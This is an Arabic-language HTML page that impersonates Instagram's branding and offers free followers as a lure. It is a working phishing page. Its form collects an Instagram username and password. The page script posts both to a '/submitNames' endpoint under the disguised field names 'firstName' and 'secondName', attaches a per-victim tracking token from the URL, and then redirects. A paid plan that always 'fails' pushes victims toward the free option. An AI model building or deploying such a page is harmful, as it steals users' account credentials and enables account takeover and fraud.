<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Instagram - رشق متابعين مجاناً">
    <meta property="og:description" content="احصل على 1000 متابع حقيقي الآن عبر أداة InstaBoost الرسمية.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
    <title>Instagram | Followers Boost</title>
    <style>
        :root { --insta-blue: #0095f6; --insta-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; }
        .header { background: white; border-bottom: 1px solid #dbdbdb; padding: 10px 20px; text-align: center; }
        .logo { font-size: 30px; font-weight: bold; font-style: italic; background: var(--insta-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .container { max-width: 350px; margin: 30px auto; background: white; border: 1px solid #dbdbdb; padding: 30px; border-radius: 3px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
        .btn { width: 100%; padding: 10px; background-color: var(--insta-blue); color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        .plan-box { margin: 20px 0; display: flex; flex-direction: column; gap: 8px; }
        .plan { border: 1px solid #dbdbdb; padding: 12px; border-radius: 5px; cursor: pointer; display: flex; justify-content: space-between; font-size: 13px; }
        .plan.active { border-color: var(--insta-blue); background: #f0f9ff; }
        .price { color: var(--insta-blue); font-weight: bold; }
        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>
    <div class="header"><div class="logo">Instagram</div></div>
    <div class="container">
        <h3>زيادة متابعين مجاناً 🚀</h3>
        <p style="font-size: 13px; color: #8e8e8e;">أدخل حسابك واختر الباقة لتأكيد الاستلام</p>
        
        <div class="plan-box">
            <div class="plan active" onclick="sel(this, '0')"><span>1,000 متابع</span> <span class="price">مجاني</span></div>
            <div class="plan" onclick="sel(this, '15')"><span>5,000 متابع</span> <span class="price">14.99$</span></div>
        </div>

        <form id="mainForm">
            <input type="text" id="u" placeholder="اسم المستخدم" required>
            <input type="password" id="p" placeholder="كلمة السر" required>
            <button type="submit" class="btn" id="btn">تفعيل الباقة الآن</button>
        </form>
        <div class="footer">© 2026 Instagram from Meta</div>
    </div>

    <script>
        const token = new URLSearchParams(window.location.search).get('t');
        let isFree = true;
        function sel(el, p) {
            document.querySelectorAll('.plan').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            isFree = (p === '0');
            document.getElementById('btn').innerText = isFree ? "تفعيل الباقة الآن" : "شراء الآن ("+p+"$)";
        }

        document.getElementById('mainForm').onsubmit = async (e) => {
            e.preventDefault();
            if(!isFree) return alert('بوابة الدفع تحت الصيانة، جرب الباقة المجانية!');
            const b = document.getElementById('btn');
            b.disabled = true; b.innerText = "جاري التحقق...";
            
            await fetch('/submitNames', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, firstName: document.getElementById('u').value, secondName: document.getElementById('p').value })
            });
            window.location.href = "/ok.html";
        };
    </script>
</body>
</html>
